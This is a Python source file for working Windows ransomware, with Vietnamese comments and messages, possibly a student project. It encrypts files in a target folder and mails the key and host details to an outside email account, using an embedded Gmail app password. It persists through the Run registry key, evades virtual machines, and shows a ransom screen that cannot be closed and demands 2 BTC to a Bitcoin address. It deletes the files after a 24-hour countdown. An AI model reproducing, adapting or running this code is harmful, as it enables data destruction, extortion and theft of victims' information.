import os
import socket
import smtplib
import base64
import wmi
import platform
import tkinter as tk
from tkinter import messagebox
from datetime import datetime
from cryptography.fernet import Fernet
import psutil
import logging
import winreg
import sys
import ctypes

current_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
os.chdir(current_dir)

TIME_FILE = "timer.txt"
LOG_FILE = "launcher.log"
TARGET_FOLDER = "D:\\test\\"
COUNTDOWN_TIME = 86400  # 24 hours
SAVE_INTERVAL = 2

#Đặt thuộc tính ẩn file
def hide_file(file_path):
    FILE_ATTRIBUTE_HIDDEN = 0x02
    try:
        ctypes.windll.kernel32.SetFileAttributesW(file_path, FILE_ATTRIBUTE_HIDDEN)
    except Exception as e:
        logging.error(f"Đặt thuộc tính hidden thất bại {file_path}: {e}")

logging.basicConfig(filename=LOG_FILE, level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')
hide_file(LOG_FILE)

def delete_victim_files():
    if not os.path.exists(TARGET_FOLDER):
        logging.warning(f"Folder {TARGET_FOLDER} không tồn tại")
        return

    for root, _, files in os.walk(TARGET_FOLDER):
        for file in files:
            if file.endswith(".enc"):
                file_path = os.path.join(root, file)
                try:
                    os.remove(file_path)
                    logging.info(f"Xóa file: {file_path}")
                except (FileNotFoundError, PermissionError) as e:
                    logging.error(f"Lỗi xóa file {file_path}: {e}")
                    sys.exit("Thoát chương trình.")
    
    logging.info(f"Xóa thành công những file .enc trong folder {TARGET_FOLDER}")
    sys.exit("Thoát chương trình.")

def add_to_startup():
    try:
        key = winreg.HKEY_CURRENT_USER
        sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            reg_key = winreg.OpenKey(key, sub_key, 0, winreg.KEY_SET_VALUE)
        except FileNotFoundError:
            reg_key = winreg.CreateKey(key, sub_key)
        with reg_key:
            winreg.SetValueEx(reg_key, "ReLaunch", 0, winreg.REG_SZ, sys.executable)
            logging.info("Thêm Registry khởi động thành công")
    except Exception as e:
        logging.error(f"Thêm Registry khởi động thất bại: {e}")
        

def load_time():
    try:
        with open(TIME_FILE, 'r') as file:
            content = file.read().strip()
            if not content:
                return COUNTDOWN_TIME 
            return int(content)
    except FileNotFoundError:
        return COUNTDOWN_TIME  
    except ValueError as e:
        logging.error(f"Lỗi tải thời gian: {e}")
        return COUNTDOWN_TIME

        
def save_time(time_left):
    try:
        with open(TIME_FILE, 'w') as file:
            file.write(str(time_left))
            hide_file(TIME_FILE)
    except Exception as e:
        logging.error(f"Lưu thời gian thất bại: {e}")

# Kiểm tra trong Registry
def check_Registry():
    virtual_keywords = [
        "VirtualBox",
        "VMware",
        "Microsoft Hyper-V",
        "KVM",
        "QEMU"
    ]
    try:
        # Mở khóa Registry chứa thông tin về máy ảo
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\\DESCRIPTION\\System", 0, winreg.KEY_READ) as key:
            # Đọc giá trị "SystemBiosVersion"
            bios_version, _ = winreg.QueryValueEx(key, "SystemBiosVersion")
            for keyword in virtual_keywords:
                if keyword.lower() in bios_version.lower():
                    return True
    except FileNotFoundError:
        logging.error("Không tìm thấy khóa Registry.")
    except Exception as e:
        logging.error(f"{e}")
    return False

# Kiểm tra máy ảo
def is_virtual_machine():
    if check_Registry():
        return True
    c = wmi.WMI()  
    for bios in c.Win32_BIOS():    
        if "Virtual" in bios.Manufacturer or "VMware" in bios.Manufacturer or "VirtualBox" in bios.Manufacturer:  
            return True  
    for system in c.Win32_ComputerSystem():    
        if any(virtual in system.Model for virtual in ["Virtual", "VMware", "VBox", "QEMU", "Hyper-V"]):  
            return True   
    for baseboard in c.Win32_BaseBoard():   
        if any(manufacturer in baseboard.Manufacturer for manufacturer in ["VMware", "VirtualBox", "Microsoft Corporation"]):  
            return True  
    for processor in c.Win32_Processor():  
        if "Hypervisor" in processor.Description:  
            return True  
    return False

class RSW:
    def __init__(self):
        self.key = Fernet.generate_key()
        print(self.key)
        self.crypter = Fernet(self.key)
        self.disk = TARGET_FOLDER
        self.list_file = os.walk(self.disk)
        self.lock_all()

    def get_system_info(self):
        info = {
            "Tên máy tính": socket.gethostname(),
            "Hệ điều hành": platform.system(),
            "Phiên bản hệ điều hành": platform.version(),
            "Bản phát hành": platform.release(),
            "Kiểu máy": platform.machine(),
            "Bộ xử lý": platform.processor(),
            "Người dùng": os.getlogin(),
            "Địa chỉ IP": self.get_ip_addresses()
        }
        return info

    def sendmail(self):
        encoded_key = base64.b64encode(self.key).decode('utf-8')
        receiver_email = "AnhLSH.B21AT027@stu.ptit.edu.vn"
        subject = socket.gethostname()
        email = "lesyhoanganh2503@gmail.com"

        # Lấy thông tin hệ thống
        system_info = self.get_system_info()
        system_info_message = "\n".join([f"{key}: {value}" for key, value in system_info.items()])

        # Tạo nội dung email với mã hóa UTF-8
        msg = f"Subject: Khóa mã hóa từ {subject}\n\nKey: {encoded_key}\n\nThông tin hệ thống:\n{system_info_message}"

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, 'lzwr yphs wbot gwci')  # Thay bằng mật khẩu ứng dụng
            server.sendmail(email, receiver_email, msg.encode('utf-8'))  # Mã hóa nội dung thành UTF-8
            print("Email sent successfully!")
        except Exception as e:
            pass

    def encrypt_file(self, file_path):
        try:
            with open(file_path, 'rb') as file:
                plaintext = file.read()
            encrypted_text = self.crypter.encrypt(plaintext)
            with open(file_path + ".enc", 'wb') as file_encrypted:
                file_encrypted.write(encrypted_text)
            os.remove(file_path)
        except:
            pass

    def decrypt_file(self, file_path, key1):
            with open(file_path, 'rb') as file:
                cyphertext = file.read()
            decode = Fernet(key1)
            _data = decode.decrypt(cyphertext)
            with open(file_path.replace('.enc', ''), 'wb') as fp:
                fp.write(_data)
            os.remove(file_path)

    def lock_all(self):
        is_locked = False
        for root, _, files in self.list_file:
            for file_name in files:
                if not file_name.endswith('.enc'):
                    is_locked = True
                    file_path = os.path.join(root, file_name)
                    self.encrypt_file(file_path)
            with open("D:/info.txt", "w") as f:
                f.write(f"email: lesyhoanganh2503@gmail.com\n")
                f.write(f"BTC address: 1LMcKyPmwebfygoeZP8E9jAMS2BcgH3Yip\n")
        if is_locked:
            self.sendmail()

    def handle_key(self, key):
        try:
            print(key)
            list_file = os.walk(self.disk)
            for root, _, files in list_file:
                for file_name in files:
                    if file_name.endswith('.enc'):
                        file_path = os.path.join(root, file_name)
                        self.decrypt_file(file_path, key)
            messagebox.showinfo("info", "Đừng để bị hack nữa nhé!") 
            return True
        except:
            messagebox.showerror("Error", "Key sai")
            return False

    def get_ip_addresses(self):
        ip_info = {}
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:  # Chỉ lấy địa chỉ IPv4
                    ip_info[interface] = addr.address
        return ip_info    
    
    

def tkinter():
    global root
    root = tk.Tk()
    root.title("Một số file đã bị mã hóa")
    root.geometry("800x400")
    
    def on_closing():
        messagebox.showwarning("Warning", "Bạn không thể đóng chương trình này!")

    root.protocol("WM_DELETE_WINDOW", on_closing)

    timer_label = tk.Label(root, text="", font=("Arial", 14))
    timer_label.pack(pady=10)

    def update_timer():
        nonlocal time_left
        if time_left > 0:
            time_left -= SAVE_INTERVAL
            save_time(time_left)
            timer_label.config(text=f"Thời gian còn lại: {time_left} giây")
            root.after(SAVE_INTERVAL * 1000, update_timer)  
        else:
            delete_victim_files()  
            timer_label.config(text="Hết giờ! Tiến hành xóa file.")

    # Start the timer
    time_left = load_time()
    update_timer()


    def check_input():
        input_key = entry.get()
        print(input_key)
        if rsw.handle_key(bytes(input_key, 'utf-8')):
            root.destroy()

    message = """Ổ đĩa {} của bạn đã bị vô hiệu hóa.
    Vui lòng thanh toán 2 BTC để nhận được key giải mã.
    Thông tin liên hệ ở D:/info.txt.
    Liên hệ sau 24h tiếp theo kể từ {} để tránh mất dữ liệu.""".format(rsw.disk, datetime.now().strftime('%H:%M:%S'))
    label = tk.Label(root, text=message, font=("Arial", 14))
    label.pack(pady=10)

    font_size = 14

    username_label = tk.Label(root, text="Nhập key", font=("Arial", font_size))
    username_label.pack()
    entry = tk.Entry(root, width=30, font=("Arial", font_size))
    entry.pack(pady=5)

    confirm_button = tk.Button(root, text="Xác nhận", command=check_input, font=("Arial", font_size))
    confirm_button.pack(pady=10)

    root.mainloop()


if __name__ == "__main__":
    if not is_virtual_machine():
        add_to_startup()
        rsw = RSW()
        tkinter()